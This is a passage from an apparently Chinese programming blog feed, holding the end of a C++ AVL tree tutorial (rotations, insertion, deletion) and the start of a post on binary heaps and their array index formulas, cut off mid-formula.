class="hljs-keyword">private</span>:<br>    AVLNodeEntry&lt;T&gt;* m_NodeRoot;<br>    <span class="hljs-keyword">int</span> m_binaryTree_length;<br>    <span class="hljs-keyword">int</span> m_m_binaryTree_maxKey;<br>    <span class="hljs-keyword">int</span> m_m_binaryTree_minKey;<br>    <span class="hljs-keyword">bool</span> m_isClear;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">AVLTree</span>();<br>    <span class="hljs-built_in">AVLTree</span>(<span class="hljs-keyword">int</span>  k,<span class="hljs-keyword">const</span> T&amp; v);<br>    ~<span class="hljs-built_in">AVLTree</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Height</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Insert</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* &amp; pNode,AVLNodeEntry&lt;T&gt;* pNodeParent,<span class="hljs-keyword">int</span> key,<span class="hljs-keyword">const</span> T&amp; value)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">Remove</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pNode,<span class="hljs-keyword">int</span> key)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Delete</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* &amp; pNode,<span class="hljs-keyword">int</span> key)</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* &amp; <span class="hljs-title">GetRootNoder</span><span class="hljs-params">()</span></span>;<br>    <br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">Search</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pNode,<span class="hljs-keyword">int</span> key)</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">GetMaxNode</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">GetMinNode</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">predecessor</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* cur_node)</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">successor</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* cur_node)</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> AVLNodeEntry&lt;T&gt;* <span class="hljs-title">CreateElementBy</span><span class="hljs-params">(<span class="hljs-keyword">int</span>  key,<span class="hljs-keyword">const</span> T&amp; value,AVLNodeEntry&lt;T&gt;* pParent= <span class="hljs-literal">nullptr</span>)</span></span>;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ClearAll</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* &amp; pNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PreOrder</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InOrder</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PostOrder</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">LevelOrder</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;<br><br>    <span class="hljs-comment">// 计算节点的高度</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CalcHeight</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* pNode)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!pNode)<span class="hljs-keyword">return</span>;<br>        pNode-&gt;height=std::<span class="hljs-built_in">max</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes),<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes))+<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">LLRotation</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">RRRotation</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">LRRotation</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;<br>    <span class="hljs-function">AVLNodeEntry&lt;T&gt;* <span class="hljs-title">RLRotation</span><span class="hljs-params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<h4 id="旋转"><a class="markdownIt-Anchor" href="#旋转"></a> 旋转</h4>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>AVLNodeEntry&lt;T&gt;* AVLTree&lt;T&gt;::<span class="hljs-built_in">LLRotation</span>(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;<br>    <span class="hljs-keyword">if</span>(!pRootNode)<span class="hljs-keyword">return</span> pRootNode;<br>    AVLNodeEntry&lt;T&gt;*  leftChild=pRootNode-&gt;left_nodes;<br>    pRootNode-&gt;left_nodes=leftChild-&gt;right_nodes;<br>    <span class="hljs-keyword">if</span>(leftChild-&gt;right_nodes!=<span class="hljs-literal">nullptr</span>)&#123;<br>        leftChild-&gt;right_nodes-&gt;parent=pRootNode;<br>    &#125;<br>    leftChild-&gt;right_nodes=pRootNode;<br>    <br>    leftChild-&gt;parent=pRootNode-&gt;parent;<br>    pRootNode-&gt;parent=leftChild;<br><br>    <span class="hljs-built_in">CalcHeight</span>(pRootNode);<br>    <span class="hljs-built_in">CalcHeight</span>(leftChild);<br><br>    pRootNode=leftChild;<br>    <span class="hljs-keyword">if</span>(pRootNode-&gt;parent==<span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">this</span>-&gt;m_NodeRoot=pRootNode;<br>    <span class="hljs-keyword">return</span> leftChild;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>AVLNodeEntry&lt;T&gt;* AVLTree&lt;T&gt;::<span class="hljs-built_in">RRRotation</span>(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;<br>    <span class="hljs-keyword">if</span>(!pRootNode)<span class="hljs-keyword">return</span> pRootNode;<br>    AVLNodeEntry&lt;T&gt;*  rightChild=pRootNode-&gt;right_nodes;<br>    pRootNode-&gt;right_nodes=rightChild-&gt;left_nodes;<br>    <span class="hljs-keyword">if</span>(rightChild-&gt;left_nodes!=<span class="hljs-literal">nullptr</span>)&#123;<br>        rightChild-&gt;left_nodes-&gt;parent=pRootNode;<br>    &#125;<br>    rightChild-&gt;left_nodes=pRootNode;<br><br>    rightChild-&gt;parent=pRootNode-&gt;parent;<br>    pRootNode-&gt;parent=rightChild; <br><br>    <span class="hljs-built_in">CalcHeight</span>(pRootNode);<br>    <span class="hljs-built_in">CalcHeight</span>(rightChild);<br><br>    pRootNode=rightChild;<br>    <span class="hljs-keyword">if</span>(pRootNode-&gt;parent==<span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">this</span>-&gt;m_NodeRoot=pRootNode;<br>    <span class="hljs-keyword">return</span> rightChild;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>AVLNodeEntry&lt;T&gt;* AVLTree&lt;T&gt;::<span class="hljs-built_in">LRRotation</span>(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">RRRotation</span>(pRootNode-&gt;left_nodes);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">LLRotation</span>(pRootNode);<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>AVLNodeEntry&lt;T&gt;* AVLTree&lt;T&gt;::<span class="hljs-built_in">RLRotation</span>(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;<br>    <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">LLRotation</span>(pRootNode-&gt;right_nodes);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">RRRotation</span>(pRootNode);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="插入"><a class="markdownIt-Anchor" href="#插入"></a> 插入</h4>
<p>插入一个新节点后，可能导致AVL树不平衡，因此需要判断平衡因子bf，若bf为2或-2说明需要进行旋转操作。不过只需要判断bf是否为2即可，这是由遍历的顺序决定的。<br />
每次插入完成都需要更新节点的高度</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> AVLTree&lt;T&gt;::<span class="hljs-built_in">Insert</span>(AVLNodeEntry&lt;T&gt;* &amp; pNode,AVLNodeEntry&lt;T&gt;* pNodeParent,<span class="hljs-keyword">int</span> key,<span class="hljs-keyword">const</span> T&amp; value) &#123;<br>    <span class="hljs-keyword">if</span>(pNode == <span class="hljs-literal">nullptr</span>)&#123;<br>        pNode=<span class="hljs-keyword">new</span> AVLNodeEntry&lt;T&gt;;<br>        pNode-&gt;key=key;<br>        pNode-&gt;left_nodes= <span class="hljs-literal">nullptr</span>;<br>        pNode-&gt;right_nodes= <span class="hljs-literal">nullptr</span>;<br>        pNode-&gt;data=value;<br>        pNode-&gt;parent=pNodeParent;<br>        pNode-&gt;height=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 遍历左子树</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &lt; pNode-&gt;key)&#123;<br>        <span class="hljs-built_in">Insert</span>(pNode-&gt;left_nodes,pNode,key,value);<br>        <span class="hljs-comment">// 插入完成后检查是否平衡了</span><br>        <span class="hljs-comment">// 若平衡因子为2表示不平衡</span><br>        <span class="hljs-comment">// 只需要判断左右两边树的高度之差</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes)-<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes)==<span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">if</span>(key &lt; pNode-&gt;left_nodes-&gt;key)&#123;<br>                <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">LLRotation</span>(pNode);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">LRRotation</span>(pNode);<br>            &#125;<br>        &#125;<br><br>    &#125;<span class="hljs-comment">// 否则右子树</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key &gt; pNode-&gt;key)&#123;<br>        <span class="hljs-built_in">Insert</span>(pNode-&gt;right_nodes,pNode,key,value);<br>        <span class="hljs-comment">// 插入完成后检查是否平衡了</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes)-<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes)==<span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">if</span>(key &gt; pNode-&gt;right_nodes-&gt;key)&#123;<br>                <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">RRRotation</span>(pNode);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">RLRotation</span>(pNode);<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-comment">//如果已经存在了</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//cout&lt;&lt;&quot;Already exist!&quot;&lt;&lt;endl;</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 插入完成后更新高度!</span><br>    <span class="hljs-comment">// 从 0 开始计数，因此需要加1</span><br>    <span class="hljs-built_in">CalcHeight</span>(pNode); <span class="hljs-comment">// +1表示包括当前根节点</span><br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h4>
<p>删除操作类似二叉查找树的删除操作，同样需要找到一个前驱/后继节点。<br />
不过此处删除操作是在一个递归函数中进行的</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> AVLTree&lt;T&gt;::<span class="hljs-built_in">Delete</span>(AVLNodeEntry&lt;T&gt;* &amp; pNode,<span class="hljs-keyword">int</span> key) &#123;<br>    <span class="hljs-keyword">if</span>(!pNode)<span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (key &lt; pNode-&gt;key)&#123;<br>        <span class="hljs-comment">// 在左子树中删除一个节点</span><br>        <span class="hljs-built_in">Delete</span>(pNode-&gt;left_nodes,key);<br>        <span class="hljs-comment">// 删除后重新平衡</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes)-<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes)==<span class="hljs-number">2</span>)&#123; <br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes-&gt;left_nodes)&gt;=<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes-&gt;right_nodes))&#123;<br>                <span class="hljs-built_in">RLRotation</span>(pNode);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">RRRotation</span>(pNode);<br>            &#125;                <br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key &gt; pNode-&gt;key)&#123;<br>        <span class="hljs-comment">// 在右子树中删除一个节点</span><br>        <span class="hljs-built_in">Delete</span>(pNode-&gt;right_nodes,key);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes)-<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes)==<span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes-&gt;left_nodes)&gt;=<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes-&gt;right_nodes))&#123;<br>                <span class="hljs-built_in">LLRotation</span>(pNode);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">LRRotation</span>(pNode);<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 左右子树都存在</span><br>        <span class="hljs-keyword">if</span> (pNode-&gt;left_nodes&amp;&amp;pNode-&gt;right_nodes)&#123;<br>            <span class="hljs-comment">// 找到一个后继节点 </span><br>            AVLNodeEntry&lt;T&gt;* successor=<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">successor</span>(pNode);<br>            pNode-&gt;key=successor-&gt;key;<br>            pNode-&gt;data=successor-&gt;data;<br>            <span class="hljs-comment">// 删除那个后继节点</span><br>            <span class="hljs-built_in">Delete</span>(pNode-&gt;right_nodes,successor-&gt;key);<br>            <span class="hljs-comment">// 然后再次重新平衡</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes)-<span class="hljs-built_in">Height</span>(pNode-&gt;right_nodes)==<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes-&gt;left_nodes)&gt;=<span class="hljs-built_in">Height</span>(pNode-&gt;left_nodes-&gt;right_nodes))&#123;<br>                    <span class="hljs-built_in">LLRotation</span>(pNode);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-built_in">LRRotation</span>(pNode);<br>                &#125;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// 删除只有一个子树和叶子情况</span><br>            <span class="hljs-keyword">auto</span> pDeleteNode=pNode;<br>             <span class="hljs-comment">// 保存其子节点，无论是否为空</span><br>            AVLNodeEntry&lt;T&gt;* childNode=<span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">if</span>(pDeleteNode-&gt;left_nodes!=<span class="hljs-literal">nullptr</span>)&#123;<br>                childNode=pDeleteNode-&gt;left_nodes;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pDeleteNode-&gt;right_nodes!=<span class="hljs-literal">nullptr</span>)&#123;<br>                childNode=pDeleteNode-&gt;right_nodes;<br>            &#125;<br>            <span class="hljs-comment">// 如果存在子节点（不是叶子），那么修改其指向父节点</span><br>            <span class="hljs-keyword">if</span>(childNode!=<span class="hljs-literal">nullptr</span>)&#123;<br>                childNode-&gt;parent=pDeleteNode-&gt;parent;<br>            &#125;<br>            <span class="hljs-comment">// 删除的是根节点</span><br>            <span class="hljs-keyword">if</span>(pDeleteNode-&gt;parent==<span class="hljs-literal">nullptr</span>)&#123;<br>                <span class="hljs-keyword">this</span>-&gt;m_NodeRoot=childNode;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pDeleteNode-&gt;parent-&gt;left_nodes==pDeleteNode)&#123;<br>                <span class="hljs-comment">// 修改待删除节点的父节点指向待删除节点的子节点</span><br>                pDeleteNode-&gt;parent-&gt;left_nodes=childNode;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pDeleteNode-&gt;parent-&gt;right_nodes==pDeleteNode)&#123;<br>                pDeleteNode-&gt;parent-&gt;right_nodes=childNode;<br>            &#125;<br>            <span class="hljs-keyword">delete</span> pDeleteNode;<br>            pDeleteNode=<span class="hljs-literal">nullptr</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 跟新节点高度</span><br>    <span class="hljs-keyword">if</span>(pNode)&#123;<br>        <span class="hljs-built_in">CalcHeight</span>(pNode);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>源码： <a href="https://josephxrays.coding.net/p/avlTree_c/git">https://josephxrays.coding.net/p/avlTree_c/git</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉堆-堆排序</title>
    <url>/binaryheap-cpp/</url>
    <content><![CDATA[<p>堆是实现<strong>优先级队列</strong>效率很高的数据结构，如C++STL priority_queue、Python PriorityQueue。堆的变体很多，二叉堆、斐波那契堆…由堆实现的一种高效排序算法为堆排序。</p>
<span id="more"></span>
<h4 id="二叉堆"><a class="markdownIt-Anchor" href="#二叉堆"></a> 二叉堆</h4>
<p>注意：数据结构中的堆和内存中的堆是两个完全不同的概念，就像数据结构栈和栈内存一样，之间没有必然联系。<br />
<code>堆(Heap)</code>也可称为大/小根堆、大/小根树，最大/小堆：</p>
<ul>
<li>其中每个节点的值大于等于或小于等于其子节点（如果存在）的值；</li>
<li>一个大根堆（小根堆）是<code>完全二叉树</code>。</li>
</ul>
<p>二叉堆由J.W.J.Williams于1964年引入，作为堆排序的数据结构。<br />
一般来说，默认<code>堆</code>指的是<strong>二叉堆(Binary heap)</strong>。<br />
由于堆是完全二叉树，因此我们可以用<code>数组</code>描述，也可以用<code>链表</code>描述，不过数组描述比较普遍。</p>
<p>二叉堆中某个节点的左右子节点无论谁大谁小，只要满足子节点的值小于其父节点的值（最大堆）或大于其父节点的值（最小堆）即可。</p>
<p><img src="/uploads/images/data_structure/heap_cpp/01.png" alt="" /></p>
<p>由于用数组描述的二叉堆，堆节点存储在数组中，那么如何用数组表示呢？节点的父子关系又如何解决？<br />
1.因为二叉堆是完全二叉树，所以从上到下，从左到右依次将二叉堆节点填入数组，数组之间没有空隙。<br />
2.这里有两种映射方式。假设父节点索引为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>，左孩子节点索引为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span>，右孩子节点索引为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>，则：<br />
数组索引从0开始：</p>
<blockquote>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mo>=</mo><mn>2</mn><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">l=2i+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mo>=</mo><mn>2</mn><mi>i</mi><mo>+</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">r=2i+2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>=</mo><mo stretchy="false">⌊</mo><mfrac><mrow><mi>l</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">⌋</mo><mo>=</mo><mo stretchy="false">⌊</mo><mfrac><mrow><mi>r</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">i=\lfloor \frac{l-1}{2} \rfloor=\lfloor \frac{r-1}{2} \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span><span class="mspace" 